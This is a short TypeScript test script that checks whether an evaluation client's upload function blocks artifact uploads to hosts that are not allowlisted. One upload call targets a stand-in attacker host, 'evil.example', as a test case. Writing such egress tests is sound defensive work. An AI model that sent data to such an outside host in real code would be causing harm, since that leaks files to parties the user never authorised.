/** Run under Node, inside the pin harness's network namespace. One JSON object on stdout. */
import { createEvaluationClient } from "../src/evals/client.js";

const port = process.env.PORT ?? "";
const bytes = new TextEncoder().encode("pinned-file-bytes");
const remote = createEvaluationClient({
  apiKey: "synthetic-upload-key",
  baseUrl: "https://hue.invalid",
  maxAttempts: 1,
  timeoutMillis: 2000,
});
const allowlisted = createEvaluationClient({
  apiKey: "synthetic-upload-key",
  baseUrl: "https://storage.hue.test",
  maxAttempts: 1,
  timeoutMillis: 2000,
});

async function once(
  client: ReturnType<typeof createEvaluationClient>,
  uploadUrl: string,
): Promise<string> {
  try {
    await client.uploadArtifactBytes(
      {
        uploadUrl,
        method: "PUT",
        headers: { "content-type": "text/plain", "x-vercel-blob-access": "private" },
        expiresAt: "2099-01-01T00:00:00.000Z",
      },
      bytes,
      "text/plain",
    );
    return "sent";
  } catch (error) {
    return error instanceof Error ? error.name : "error";
  }
}

const result = {
  evil: await once(remote, `https://evil.example:${port}/evil`),
  loop: await once(remote, `https://loop.hue.test:${port}/loop`),
  pin: await once(allowlisted, `https://storage.hue.test:${port}/pinned?sig=keep`),
};
console.log(JSON.stringify(result));
